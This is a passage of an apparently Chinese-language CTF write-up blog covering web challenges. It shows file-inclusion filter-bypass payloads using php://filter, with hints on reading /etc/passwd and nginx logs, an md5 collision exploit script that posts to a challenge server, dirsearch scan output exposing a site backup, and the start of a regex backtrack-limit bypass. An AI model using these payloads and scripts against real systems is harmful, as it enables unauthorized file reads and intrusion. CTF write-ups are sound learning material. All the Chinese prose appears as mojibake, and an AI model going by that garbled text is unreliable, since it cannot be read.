it!</code><br>æµ‹è¯•ä¸€ä¸‹å‘ç°è¿‡æ»¤äº†phpã€filterã€baseã€dataã€fileç­‰å…³é”®å­—<br>ç„¶åå°±æœä¸€å †ç»•è¿‡çš„æ–¹æ³•</p><ul><li>å¦‚æœbaseè¢«ç»•è¿‡äº†ï¼Œå¯ä»¥ä½¿ç”¨urlç¼–ç convertå¾€åï¼Œresourceå¾€å‰çš„å­—ç¬¦<code>?filename=pHp://filtEr/convert.%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565/resource=</code></li><li>é™¤äº†æµ‹è¯•æ–‡ä»¶<code>/etc/passwd</code>ä¹‹å¤–ï¼Œå¦‚æœæ˜¯nginxï¼Œå¯ä»¥è€ƒè™‘è¯»æ—¥å¿—<code>/var/log/nginx/access.log</code></li><li>å¦‚æœè¯»<code>flag.php</code>ï¼Œè®°å¾—å…ˆè®¿é—®ä¸€ä¸‹çœ‹çœ‹é¡µé¢æ˜¯å¦å­˜åœ¨</li></ul><p>æœ€åï¼Œè¿™é“é¢˜çš„è§£æ³•æ˜¯æœ€ç®€å•çš„åŒå†™ç»•è¿‡<br><code>?filename=pphphp://filfilterter/convert.basbasee64-encode/resource=flag.pphphp</code></p><p><code>XSCTF&#123;d0ubLe_Wr1te_2_byPass&#125;</code></p><p>éº»äº†</p><h2 id="canyoupassit"><a href="#canyoupassit" class="headerlink" title="canyoupassit"></a>canyoupassit</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">&#x27;a1&#x27;</span>] != $_POST[<span class="string">&#x27;b1&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a1&#x27;</span>] == md5($_POST[<span class="string">&#x27;b1&#x27;</span>])))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æ­å–œä½ è¿‡äº†ç¬¬ä¸€å…³!&quot;</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å°±è¿™?&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">&#x27;key&#x27;</span>] == md5($_POST[<span class="string">&#x27;key&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æ­å–œä½ è¿‡äº†ç¬¬äºŒå…³!&quot;</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å†çœ‹çœ‹?&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">$now = time();  </span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">&#x27;a2&#x27;</span>] != $_POST[<span class="string">&#x27;b2&#x27;</span>] &amp;&amp; str_starts_with($_POST[<span class="string">&#x27;a2&#x27;</span>], $now) &amp;&amp; str_starts_with($_POST[<span class="string">&#x27;b2&#x27;</span>], $now) &amp;&amp; md5($_POST[<span class="string">&#x27;a2&#x27;</span>] === md5($_POST[<span class="string">&#x27;b2&#x27;</span>])))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æ­å–œä½ è¿‡äº†ç¬¬ä¸‰å…³!&quot;</span>;  </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;/flag&quot;</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;çœŸå¯æƒœï¼Œå°±å·®æœ€åä¸€æ­¥äº†&quot;</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€é“æœ‰å…³md5ç»•è¿‡çš„é¢˜ç›®ï¼Œä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†</p><ol><li>ä¸åŒå€¼çš„å˜é‡ï¼Œmd5çš„å€¼æ˜¯ä¸€æ ·çš„ï¼ˆå¼±æ¯”è¾ƒï¼‰ â€“ md5å¼±ç¢°æ’</li><li>md5å€¼ç­‰äºè‡ªèº«çš„å€¼ï¼ˆ<strong>å¼±æ¯”è¾ƒ</strong>ï¼‰ â€“ 0eç»•è¿‡</li><li>ä¸åŒå€¼çš„md5æ˜¯ä¸€æ ·çš„ï¼ˆ<strong>å¼ºæ¯”è¾ƒ</strong>ï¼‰ï¼Œä¸”è¦æ±‚ä¸¤ä¸ªå€¼éƒ½æœ‰ç‰¹å®šå‰ç¼€</li></ol><p>è§£å†³çš„æ–¹æ³•å¦‚ä¸‹ï¼š</p><ol><li>å¯¹äºå¼±æ¯”è¾ƒçš„md5å€¼ï¼Œå¯ä»¥ç›´æ¥ç™¾åº¦ç‰¹å®šçš„å€¼<ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li><li>s214587387a</li><li>s214587387a<br>è¿™äº›å­—ç¬¦ä¸²çš„ md5 å€¼éƒ½æ˜¯ 0e å¼€å¤´ï¼Œåœ¨ php å¼±ç±»å‹æ¯”è¾ƒä¸­åˆ¤æ–­ä¸ºç›¸ç­‰</li></ul></li><li>å¯¹äºè‹¥æ¯”è¾ƒçš„<code>$a == md5($a)</code>ï¼Œå­˜åœ¨0eå¼€å¤´çš„å€¼md5ä¹‹åè¿˜æ˜¯0eå¼€å¤´ï¼Œè¿™æ ·åœ¨å¼±æ¯”è¾ƒä¸­ä»ç„¶ç›¸ç­‰ï¼Œå¦‚<code>0e215962017</code></li><li>å¯¹äºå¼ºæ¯”è¾ƒï¼Œå¯ä»¥é‡‡ç”¨md5å¼ºç¢°æ’çš„æ–¹å¼ï¼Œç½‘ä¸Šæœ‰ç‰¹å®šçš„å€¼å¯ä»¥æ»¡è¶³å€¼ä¸åŒä½†æ˜¯md5å€¼ç›¸åŒï¼Œä½†æ˜¯è¿™é‡Œå­˜åœ¨å¦å¤–ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯è¿™ä¸¤ä¸ªå€¼çš„å‰ç¼€å¿…é¡»æ˜¯å½“å‰æ—¶é—´ï¼Œè¿™å°±éœ€è¦è‡ªå·±ç”Ÿæˆç‰¹å®šçš„ä¸¤ä¸ªå€¼ï¼Œä½¿ç”¨<code>fastcoll</code>å·¥å…·ï¼Œå¯ä»¥ç”Ÿæˆç‰¹å®šå‰ç¼€çš„å€¼æ¥æ»¡è¶³æ¡ä»¶ï¼Œè¿™ä¸ªç‰¹å®šå‰ç¼€å°±æ˜¯å½“å‰æ—¶é—´</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">t = <span class="built_in">int</span>(time.time()+<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;t.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">str</span>(t))</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;fastcoll_v1.0.0.5.exe t.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line">a2 = <span class="built_in">open</span>(<span class="string">&#x27;t_msg1.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">b2 = <span class="built_in">open</span>(<span class="string">&#x27;t_msg2.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.248.97.213:30038/&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;a1&#x27;</span>: <span class="string">&#x27;s214587387a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b1&#x27;</span>: <span class="string">&#x27;s155964671a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span> : <span class="string">&#x27;0e215962017&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a2&#x27;</span>: a2,</span><br><span class="line">    <span class="string">&#x27;b2&#x27;</span>: b2,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ä¸€äº›è¦æ³¨æ„çš„ç‚¹</p><ul><li>ç‰¹å®šå‰ç¼€çš„æ—¶é—´æœ€å¥½å¾€åè°ƒä¸€è°ƒï¼Œé¿å…å› ç½‘ç»œé—®é¢˜å¯¼è‡´é”™è¿‡æ—¶é—´</li><li>ç”Ÿæˆçš„ä¸¤ä¸ªtxtéœ€è¦ä»¥äºŒè¿›åˆ¶çš„å½¢å¼è¯»å–</li></ul><p><code>flag&#123;y0v|nDeedReA11yk$nwAb0uTMD5!~_~^_^&#125;</code></p><h2 id="Ezgame"><a href="#Ezgame" class="headerlink" title="Ezgame"></a>Ezgame</h2><p>è¿›å…¥æ˜¯ä¸€ä¸ªå°æ¸¸æˆï¼Œè¦æ±‚è¾¾åˆ°éå¸¸é«˜çš„åˆ†æ•°</p><p><img src="https://s2.loli.net/2024/11/05/wSjykCZa9XJ7edM.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/wSjykCZa9XJ7edM.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026193535.png"></p><p>ç›´æ¥ç©è‚¯å®šä¸ç°å®ï¼Œäºæ˜¯ç¿»ç¿»jsä»£ç <br>å› ä¸ºä¸æ˜¯é€šè¿‡phpè®°å½•åˆ†æ•°çš„ï¼Œæ‰€ä»¥ä¸å¯ä»¥ä½¿ç”¨POSTè¯·æ±‚ä¹‹ç±»çš„ä¿®æ”¹åˆ†æ•°</p><p>å…¥æ‰‹çš„æ€è·¯æ˜¯é€šè¿‡æµè§ˆå™¨æ§åˆ¶å°è®¿é—®æ‰€æœ‰çš„å¯¹è±¡ï¼Œç„¶åæ‰¾åˆ°å­˜å‚¨åˆ†æ•°çš„å˜é‡ï¼Œç›´æ¥åœ¨æ§åˆ¶å°ä¿®æ”¹å˜é‡<br>ç¿»äº†åå‡ ä»½ä»£ç ä¹‹åå»æ§åˆ¶å°æŸ¥çœ‹å¯¹è±¡ï¼Œä»å…¨å±€å¯¹è±¡å…¥æ‰‹ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†è¿™äº›<br><img src="https://s2.loli.net/2024/11/05/FMiTn2lvewczJ83.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/FMiTn2lvewczJ83.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026194009.png"></p><p><img src="https://s2.loli.net/2024/11/05/AzUIKpGtRdwu5gM.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/AzUIKpGtRdwu5gM.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026194244.png"><br>çœ‹èµ·æ¥åƒæ˜¯å­˜å‚¨æ¸¸æˆè§’è‰²çš„å˜é‡<br>äºæ˜¯ç›´æ¥ä¿®æ”¹å…¶ä¸­çš„goldå’Œkillsä»¥åŠhigh_scoreï¼ˆä¸çŸ¥é“æ”¹å“ªä¸ªï¼Œå¹²è„†å…¨æ”¹äº†)</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;id&quot;</span>:<span class="string">&quot;o1&quot;</span>,<span class="attr">&quot;ownerId&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;position&quot;</span>:&#123;<span class="attr">&quot;x&quot;</span>:<span class="number">359.04999999999956</span>,<span class="attr">&quot;y&quot;</span>:<span class="number">154.2499999999999</span>&#125;,<span class="attr">&quot;size&quot;</span>:&#123;<span class="attr">&quot;width&quot;</span>:<span class="number">32</span>,<span class="attr">&quot;height&quot;</span>:<span class="number">32</span>&#125;,<span class="attr">&quot;direction&quot;</span>:&#123;<span class="attr">&quot;x&quot;</span>:<span class="number">-1</span>,<span class="attr">&quot;y&quot;</span>:<span class="number">0</span>&#125;,<span class="attr">&quot;facing&quot;</span>:&#123;<span class="attr">&quot;x&quot;</span>:<span class="number">-1</span>,<span class="attr">&quot;y&quot;</span>:<span class="number">0</span>&#125;,<span class="attr">&quot;speed&quot;</span>:<span class="number">150</span>,<span class="attr">&quot;team&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;hitPoints&quot;</span>:<span class="number">100</span>,<span class="attr">&quot;damage&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;spriteSheet&quot;</span>:<span class="string">&quot;characters&quot;</span>,<span class="attr">&quot;spriteX&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;spriteY&quot;</span>:<span class="number">992</span>,<span class="attr">&quot;spriteAlign&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;animated&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;animFrameIndex&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;animNumFrames&quot;</span>:<span class="number">2</span>,<span class="attr">&quot;animDelay&quot;</span>:<span class="number">200</span>,<span class="attr">&quot;animElapsed&quot;</span>:<span class="number">16</span>,<span class="attr">&quot;spawnFrameIndex&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;spawnFrameCount&quot;</span>:<span class="number">2</span>,<span class="attr">&quot;spawnFramesX&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;spawnFramesY&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;angle&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;rotateSpeed&quot;</span>:<span class="number">400</span>,<span class="attr">&quot;rotate&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;worth&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;ttl&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;ttlElapsed&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;alpha&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;alphaMod&quot;</span>:<span class="number">-1</span>,<span class="attr">&quot;gibletSize&quot;</span>:<span class="string">&quot;small&quot;</span>,<span class="attr">&quot;cooldown&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;cooldownElapsed&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;autoFire&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;soundAttacks&quot;</span>:<span class="string">&quot;hero_attacks&quot;</span>,<span class="attr">&quot;soundDamage&quot;</span>:<span class="string">&quot;hero_damage&quot;</span>,<span class="attr">&quot;soundDies&quot;</span>:<span class="string">&quot;hero_dies&quot;</span>,<span class="attr">&quot;alive&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;states&quot;</span>:[&#123;<span class="attr">&quot;type&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;timer&quot;</span>:&#123;<span class="attr">&quot;elapsed_ms&quot;</span>:<span class="number">43298</span>,<span class="attr">&quot;ttl&quot;</span>:<span class="number">0</span>&#125;&#125;,<span class="literal">null</span>,<span class="literal">null</span>],<span class="attr">&quot;currentWeaponIndex&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;collidable&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;bounce&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;piercing&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;achievementId&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;deathsForAchievement&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;ignoreLogDeath&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;damageType&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;drawIndex&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;moveChangeElapsed&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;moveChangeDelay&quot;</span>:<span class="number">500</span>,<span class="attr">&quot;wounds&quot;</span>:<span class="number">15</span>,<span class="attr">&quot;weapons&quot;</span>:[&#123;<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;h_sword&quot;</span>,<span class="attr">&quot;count&quot;</span>:<span class="literal">null</span>&#125;,&#123;<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;h_spear&quot;</span>,<span class="attr">&quot;count&quot;</span>:<span class="number">82</span>&#125;],<span class="attr">&quot;gold&quot;</span>:<span class="number">1000000000</span>,<span class="attr">&quot;kills&quot;</span>:<span class="number">10000000000</span>,<span class="attr">&quot;timesWounded&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;totalDamageTaken&quot;</span>:<span class="number">15</span>,<span class="attr">&quot;shotsFired&quot;</span>:<span class="number">108</span>,<span class="attr">&quot;shotsLanded&quot;</span>:<span class="number">65</span>,<span class="attr">&quot;shotsPerWeapon&quot;</span>:&#123;<span class="attr">&quot;h_sword&quot;</span>:<span class="number">28</span>,<span class="attr">&quot;h_knife&quot;</span>:<span class="number">31</span>,<span class="attr">&quot;h_spear&quot;</span>:<span class="number">18</span>&#125;,<span class="attr">&quot;meatEaten&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;cheater&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;phase&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;phaseInit&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;lootTable&quot;</span>:[],<span class="attr">&quot;killSwitch&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;hero&quot;</span>,<span class="attr">&quot;role&quot;</span>:<span class="string">&quot;hero&quot;</span>,<span class="attr">&quot;isMeatboy&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;bloodTimer&quot;</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè¿”å›æ¸¸æˆå‘ç°æ•°æ®æ²¡æœ‰å˜åŒ–<br>ä»¥ä¸ºé”™äº†ï¼Œé€€å‡ºå»ï¼Œç„¶ååœ¨ä¸»ç•Œé¢å‘ç°äº†flag<br><img src="https://s2.loli.net/2024/11/05/3pGuqBM7yFb2JwI.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/3pGuqBM7yFb2JwI.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026194359.png"></p><p><code>flag&#123;basju_D0G006706_iajdisaia&#125;</code></p><h2 id="hardphp"><a href="#hardphp" class="headerlink" title="hardphp"></a>hardphp</h2><p>è¿›å…¥é¢˜ç›®ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œåªæœ‰ä¸€å¥è¯<code>å°è¯•å¤§å£°å–Šå‡ºvæˆ‘50!!!æˆ‘å°±ä¼šç»™ä½ flag</code><br>åªèƒ½æ‰«åå°äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">~$ dirsearch -u http://43.248.97.213:30090/</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927</span><br><span class="line"></span><br><span class="line">Output File: /home/xr/.dirsearch/reports/43.248.97.213-30090/-_24-10-28_22-14-33.txt</span><br><span class="line"></span><br><span class="line">Error Log: /home/xr/.dirsearch/logs/errors-24-10-28_22-14-33.log</span><br><span class="line"></span><br><span class="line">Target: http://43.248.97.213:30090/</span><br><span class="line"></span><br><span class="line">[22:14:33] Starting:</span><br><span class="line">[22:14:37] 403 -  223B  - /.htaccess.orig</span><br><span class="line">[22:14:37] 403 -  225B  - /.htaccess.sample</span><br><span class="line">[22:14:37] 403 -  223B  - /.htaccess.bak1</span><br><span class="line">[22:14:37] 403 -  220B  - /.ht_wsr.txt</span><br><span class="line">[22:14:37] 403 -  223B  - /.htaccess.save</span><br><span class="line">[22:14:37] 403 -  224B  - /.htaccess_extra</span><br><span class="line">[22:14:38] 403 -  221B  - /.htaccess_sc</span><br><span class="line">[22:14:38] 403 -  223B  - /.htaccess_orig</span><br><span class="line">[22:14:38] 403 -  214B  - /.html</span><br><span class="line">[22:14:38] 403 -  219B  - /.htpasswds</span><br><span class="line">[22:14:38] 403 -  221B  - /.htaccessBAK</span><br><span class="line">[22:14:38] 403 -  221B  - /.htaccessOLD</span><br><span class="line">[22:14:38] 403 -  213B  - /.htm</span><br><span class="line">[22:14:38] 403 -  222B  - /.htaccessOLD2</span><br><span class="line">[22:14:38] 403 -  220B  - /.httr-oauth</span><br><span class="line">[22:14:38] 403 -  223B  - /.htpasswd_test</span><br><span class="line">[22:15:05] 200 -  304B  - /index.php</span><br><span class="line">[22:15:05] 200 -  304B  - /index.php/login/</span><br><span class="line">[22:15:17] 403 -  222B  - /server-status</span><br><span class="line">[22:15:17] 403 -  223B  - /server-status/</span><br><span class="line">[22:15:25] 200 -  825B  - /www.zip</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure><p> æ‰«å‡ºæ¥ä¸‰ä¸ªï¼Œå…¶ä¸­<a href="http://www.zipæ˜¯ç½‘ç«™çš„å¤‡ä»½/">www.zipæ˜¯ç½‘ç«™çš„å¤‡ä»½</a><br>è§£å‹ä¹‹åå‘ç°æœ‰ä¸ª<code>flagflaghhh.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">  </span><br><span class="line">$input = $_POST[<span class="string">&#x27;a&#x27;</span>];  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($input)) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (substr($input, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">&quot;vme50&quot;</span> <span class="keyword">and</span> substr($input, <span class="number">-1</span>, <span class="number">1</span>) == <span class="string">&quot;!&quot;</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> ($input == <span class="string">&quot;vme50!&quot;</span>) &#123;  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Speak a little louder, I can&#x27;t hear you!&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/vme50.+?!/is&#x27;</span>, $input)) &#123;  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;xing bu xing a.Speak much louder!&quot;</span>);  </span><br><span class="line">        &#125;        system(<span class="string">&quot;cat /flag&quot;</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span>  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Bie lai zhan bian!!!&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹ä¼ å…¥çš„aå‚æ•°æœ‰ä¸‰ä¸ªæ¡ä»¶</p><ol><li><p>ä»¥<code>vme50</code>ä¸ºå¼€å¤´ï¼Œä»¥æ„Ÿå¹å·ä¸ºæœ«å°¾</p></li><li><p>ä¸å¯ä»¥æ˜¯<code>vme50</code></p></li><li><p>ä¸å¯ä»¥æ»¡è¶³æ­£åˆ™è¡¨è¾¾å¼<code>/vme50.+?!/is</code>ï¼Œè¯¥æ­£åˆ™è¡¨è¾¾å¼çš„æ„æ€æ˜¯åŒ¹é…ä»¥<code>vme50</code>å¼€å¤´ï¼Œä»¥æ„Ÿå¹å·ä¸ºæœ«å°¾ï¼Œä¸”æ•°å­—0åé¢æœ‰è‹¥å¹²ä¸ªé›¶çš„å­—ç¬¦ä¸²ï¼Œä¸€æ—¦åŒ¹é…åˆ°å°±ç®—å¤±è´¥</p></li><li><p><code>/</code>ï¼šæ­£åˆ™è¡¨è¾¾å¼çš„å¼€å§‹å’Œç»“æŸæ ‡è®°ã€‚</p></li><li><p><code>vme50</code>ï¼šå­—é¢æ„ä¹‰ä¸Šçš„å­—ç¬¦ä¸² â€œvme50â€ï¼Œè¡¨ç¤ºåŒ¹é…æ–‡æœ¬ä¸­åŒ…å« â€œvme50â€ çš„éƒ¨åˆ†ã€‚</p></li><li><p><code>.</code>ï¼šç‚¹å·ï¼ˆ<code>.</code>ï¼‰åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æ˜¯ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œè¡¨ç¤ºåŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦ï¼ˆé™¤äº†æ¢è¡Œç¬¦ï¼‰ã€‚</p></li><li><p><code>+</code>ï¼šåŠ å·ï¼ˆ<code>+</code>ï¼‰è¡¨ç¤ºå‰é¢çš„å­—ç¬¦ï¼ˆåœ¨è¿™ä¸ªä¾‹å­ä¸­æ˜¯ç‚¹å· <code>.</code>ï¼‰å‡ºç°ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚</p></li><li><p><code>?</code>ï¼šé—®å·ï¼ˆ<code>?</code>ï¼‰åœ¨è¿™é‡Œä¸ <code>+</code> ç»“åˆä½¿ç”¨ï¼Œè¡¨ç¤ºå‰é¢çš„å­—ç¬¦ï¼ˆç‚¹å· <code>.</code>ï¼‰å‡ºç°ä¸€æ¬¡æˆ–å¤šæ¬¡ï¼Œä½†å°½å¯èƒ½å°‘åœ°åŒ¹é…ï¼Œè¿™æ˜¯ä¸€ç§éè´ªå©ªåŒ¹é…ã€‚</p></li><li><p><code>!</code>ï¼šæ„Ÿå¹å·ï¼ˆ<code>!</code>ï¼‰åœ¨è¿™é‡Œæ˜¯ä¸€ä¸ªæ™®é€šå­—ç¬¦ï¼Œè¡¨ç¤ºåŒ¹é…æ–‡æœ¬ä¸­åŒ…å« <code>!</code> çš„éƒ¨åˆ†ã€‚</p></li><li><p><code>/is</code>ï¼šè¿™æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„ä¿®é¥°ç¬¦éƒ¨åˆ†ï¼Œ<code>i</code> è¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ï¼Œ<code>s</code> è¡¨ç¤ºç‚¹å· <code>.</code> å¯ä»¥åŒ¹é…ä»»æ„å­—ç¬¦ï¼ŒåŒ…æ‹¬æ¢è¡Œç¬¦ã€‚</p></li></ol><p>ä»”ç»†è§‚å¯Ÿå°±ä¼šå‘ç°æ¡ä»¶2å’Œæ¡ä»¶3å†²çªäº†ï¼Œå› æ­¤ç»•ä¸è¿‡preg_match<br>ä½†æ˜¯å‡½æ•°preg_matchå­˜åœ¨ä¸€ä¸ªé™åˆ¶ï¼Œå°±æ˜¯åŒ¹é…çš„æ¬¡æ•°ï¼Œè¶…è¿‡ä¸€å®šæ¬¡æ•°çš„åŒ¹é…ä¼šç›´æ¥è¿”å›FALSEï¼Œè¿™ä¸ªé™åˆ¶ä¸€èˆ¬æ˜¯100ä¸‡<br>æ‰€ä»¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 